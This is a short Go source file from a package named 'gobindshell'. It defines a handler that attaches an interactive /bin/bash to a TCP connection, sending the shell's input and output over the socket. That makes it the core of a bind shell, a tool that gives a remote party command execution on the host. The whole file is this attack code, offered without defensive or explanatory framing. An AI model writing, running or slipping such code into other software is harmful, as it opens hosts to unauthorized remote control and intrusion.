package gobindshell

import (
	"io"
	"log"
	"net"
	"os/exec"
)

func shell(con *net.TCPConn) {
	rp, wp := io.Pipe()
	cmd := exec.Command("/bin/bash", "-i") //for linux

	cmd.Stdin = con
	cmd.Stdout = wp

	go func() { //copy result to the connection
		_, err := io.Copy(con, rp)
		if err != nil {
			log.Fatal("[+] Cant Copy: ", err.Error())
		}
	}()

	cmd.Run()
	con.Close()
}
